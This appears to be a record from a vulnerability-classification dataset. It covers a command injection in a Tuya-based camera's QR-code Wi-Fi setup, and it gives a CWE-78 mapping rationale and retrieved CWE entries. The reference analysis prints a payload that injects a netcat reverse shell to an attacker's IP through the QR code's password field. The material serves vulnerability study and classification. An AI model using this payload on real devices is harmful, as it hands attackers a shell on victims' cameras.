  "description": "KERUI HD 3MP 1080P Tuya Camera 1.0.4 has a **command injection** vulnerability in the module that connects to the local network via a QR code. This vulnerability allows an attacker to create a custom, unauthenticated QR code and abuse one of the parameters, either SSID or PASSWORD, in the JSON data contained within the QR code. By that, the attacker can execute arbitrary code on the camera.",

  "reference_content": "Based on the provided content, here's a breakdown of the vulnerability described:\n\n**Root Cause of Vulnerability:**\nThe root cause is a command injection vulnerability in the `sys_connect_wifi` function. This function takes the SSID and password extracted from a scanned QR code and uses them to construct a shell command for connecting to Wi-Fi. The lack of sanitization on these inputs allows an attacker to inject arbitrary commands into the shell command.\n\n**Weaknesses/Vulnerabilities Present:**\n- **Command Injection:** The primary vulnerability is the direct use of user-provided (QR code scanned) input (SSID and password) within a system command without proper sanitization. This allows an attacker to execute arbitrary shell commands on the device.\n\n**Impact of Exploitation:**\n- **Remote Code Execution (RCE):** Successful exploitation allows an attacker to execute arbitrary code on the camera.\n- **Full System Control:** With RCE, an attacker can gain complete control over the camera, potentially leading to:\n    - Data exfiltration (e.g., video feeds)\n    - Modification of camera settings\n    - Installation of malware\n    - Use of the camera as a bot in a botnet\n\n**Attack Vectors:**\n- **QR Code Scanning:** The attack vector is the camera's QR code scanning functionality, used to connect to Wi-Fi networks.\n- **Malicious QR Code:** The attacker crafts a malicious QR code containing a specially crafted payload within the password field that includes shell commands.\n\n**Required Attacker Capabilities/Position:**\n- **Physical Access:** The attacker needs to present the malicious QR code to the camera's lens.\n- **Basic Network Knowledge:** The attacker needs basic network knowledge to set up a listener for the reverse shell, and create a network for the camera to connect to.\n- **QR Code Generation:** Ability to generate a QR code with a specific format and command injection payload.\n\n**Technical Details:**\n- The vulnerable function is `sys_connect_wifi`.\n- The vulnerability occurs because the `ssid` and `password` parameters from the scanned QR code are used directly in a call to the `system()` function without proper sanitization.\n- The attacker can inject a payload, for example `$(sh /usr/sbin/lv_wifi_connect.sh {SSID} {PASSWORD} & sleep 30; nc {NC_IP} {NC_PORT} -e /bin/sh)`, into the password field of the QR code.\n- The camera connects to the wifi using `lv_wifi_connect.sh` script and after some time a reverse shell will connect to the attacker's netcat listener.\n\n**Additional Notes:**\n- The article mentions that the vendor (TUYA) has not responded to the vulnerability report.\n- Other potential vulnerabilities, like buffer overflows, were identified but not focused on due to the ease of exploitation of the command injection vulnerability.\n- The article details the process of gaining root access to the device via UART, extracting the firmware, enabling telnet and FTP, debugging, and reverse engineering the binary to find the vulnerability, these steps are not necessary for exploitation but provided more context of the device's inner workings.",

Since the vulnerability specifically involves injecting commands into the operating system via the `system()` call, CWE-78, a Base level CWE, is more appropriate and specific than its parent, CWE-77, a Class level CWE.\n\n```mermaid\ngraph TD\n    cwe78[\"CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\"]\n    cwe77[\"CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')\"]\n    \n    cwe78 -->|CHILDOF| cwe77\n    \n    classDef primary fill:#f96,stroke:#333,stroke-width:2px\n    classDef secondary fill:#69f,stroke:#333\n    \n    class cwe78 primary\n    class cwe77 secondary\n```\n\n## Vulnerability Chain\n\nThe vulnerability chain starts with the **improper neutralization** of the SSID and password parameters from the QR code. This leads directly to **OS Command Injection**, which in turn results in arbitrary code execution on the camera.\n\nRoot Cause: **CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')**\n\nImpact: Arbitrary Code Execution\n\n## Summary of Analysis\n\nThe initial assessment identified **command injection** as the primary **weakness**, which aligns with both CWE-77 and CWE-78. The \"CVE Reference Links Content Summary\" confirms that the `ssid` and `password` parameters extracted from a scanned QR code are used to construct a shell command for connecting to Wi-Fi using the `system()` function. The lack of sanitization allows injection of arbitrary commands, making CWE-78 the more specific and accurate classification.\n\nThe graph relationships further reinforce this decision. CWE-78 is a child of CWE-77, indicating that it is a more specific type of command injection that occurs at the OS level. The provided evidence clearly demonstrates that the injected commands are executed by the operating system, solidifying the choice of CWE-78.\n\nThe Retriever Results listed CWE-77 as the top combined result, however, CWE-78 was a close second and is at the Base level of abstraction. Given the specificity of the vulnerability description and the evidence from the CVE summary, CWE-78 is the more appropriate choice because it is at the Base level of abstraction and it involves OS commands.\n\nRelevant CWE Information:\n\n# Enhanced Context (25 CWEs)\n\n## CWE-790: Improper Filtering of Special Elements\n**Abstraction Level**: Class\n**Similarity Score**: 0.74\n**Source**: dense\n\n**Description**:\nThe product receives data from an upstream component, but does not filter or incorrectly filters special elements before sending it to a downstream component.\n\n**Mapping Guidance**:\n- Usage: Allowed-with-Review\n- Rationale: This CWE entry is a Class and might have Base-level children that would be more appropriate\n\n## CWE-1391: Use of Weak Credentials\n**Abstraction Level**: Class\n**Similarity Score**: 0.74\n**Source**: dense\n\n**Description**:\nThe product uses weak credentials (such as a default key or hard-coded password) that can be calculated, derived, reused, or guessed by an attacker.\n\n**Mapping Guidance**:\n- Usage: Allowed-with-Review\n- Rationale: This CWE entry is a Class and might have Base-level children that would be more appropriate\n\n## CWE-134: Use of Externally-Controlled Format String\n**Abstraction Level**: Base\n**Similarity Score**: 0.73\n**Source**: dense\n\n**Description**:\nThe product uses a function that accepts a format string as an argument, but the format string originates from an external source.\n\n**Mapping Guidance**:\n- Usage: Allowed\n- Rationale: This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.\n\n## CWE-345: Insufficient Verification of Data Authenticity\n**Abstraction Level**: Class\n**Similarity Score**: 0.73\n**Source**: dense\n\n**Description**:\nThe product does not sufficiently verify the origin or authenticity of data, in a way that causes it to accept invalid data.\n\n**Mapping Guidance**:\n- Usage: Discouraged\n- Rationale: This CWE entry is a level-1 Class (i.e., a child of a Pillar).
